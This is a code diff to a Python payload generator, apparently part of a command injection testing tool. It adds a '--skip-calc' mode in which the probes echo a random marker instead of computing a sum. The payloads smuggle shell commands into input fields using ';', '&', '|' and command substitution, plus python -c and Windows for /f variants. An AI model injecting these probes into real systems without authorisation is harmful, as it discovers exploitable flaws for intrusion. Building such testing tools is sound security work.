@@ -52,6 +52,7 @@ def basic_payload_generator():
   calc_string = str(rand_a) + "+" + str(rand_b)
   marker1 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
   marker2 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
+  marker3 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
 
   suffix = ""
   if settings.USE_BACKTICKS:
@@ -62,14 +63,25 @@ def basic_payload_generator():
   else:
     prefix = "("
     suffix = ")"
-  settings.BASIC_STRING = prefix + calc_string + suffix
-  alter_interpreter_basic_string = " -c \"print(int(" + calc_string + "))\""
+
+  if settings.SKIP_CALC:
+    # '--skip-calc' covers the detection phase, and the heuristic is part of it - so what the target
+    # has to print back between the markers is a marker it had to run a command to produce.
+    expected = marker3
+    settings.BASIC_STRING = "echo " + marker3
+    windows_proof = "echo " + marker3
+    alter_interpreter_basic_string = " -c \"print('" + marker3 + "')\""
+  else:
+    expected = str(rand_a + rand_b)
+    settings.BASIC_STRING = prefix + calc_string + suffix
+    windows_proof = "set /a " + settings.BASIC_STRING
+    alter_interpreter_basic_string = " -c \"print(int(" + calc_string + "))\""
 
   settings.BASIC_COMMAND_INJECTION_PAYLOADS = [";echo " + marker1 + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + marker2 +
                                               "&echo " + marker1 + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + marker2 +
                                               "|echo " + marker1 + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + marker2,
-                                              "|echo " + marker1 + "&set /a " + settings.BASIC_STRING + "&echo " + marker2 +
-                                              "&echo " + marker1 + "&set /a " + settings.BASIC_STRING + "&echo " + marker2
+                                              "|echo " + marker1 + "&" + windows_proof + "&echo " + marker2 +
+                                              "&echo " + marker1 + "&" + windows_proof + "&echo " + marker2
                                               ]
   settings.ALTER_INTERPRETER_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_interpreter_basic_string + settings.CMD_SUB_SUFFIX + marker2 +
                                               "&echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_interpreter_basic_string + settings.CMD_SUB_SUFFIX + marker2 +
@@ -77,7 +89,7 @@ def basic_payload_generator():
                                               "|echo " + marker1 + "&for /f \"tokens=* eol=\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_interpreter_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "&echo " + marker2 +
                                               "&echo " + marker1 + "&for /f \"tokens=* eol=\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_interpreter_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "&echo " + marker2
                                               ]
-  settings.BASIC_COMMAND_INJECTION_RESULT = re.escape(marker1) + r"\s*" + re.escape(str(rand_a + rand_b)) + r"\s*" + re.escape(marker2)
+  settings.BASIC_COMMAND_INJECTION_RESULT = re.escape(marker1) + r"\s*" + re.escape(expected) + r"\s*" + re.escape(marker2)
 
 """
 Initializing basic level check status
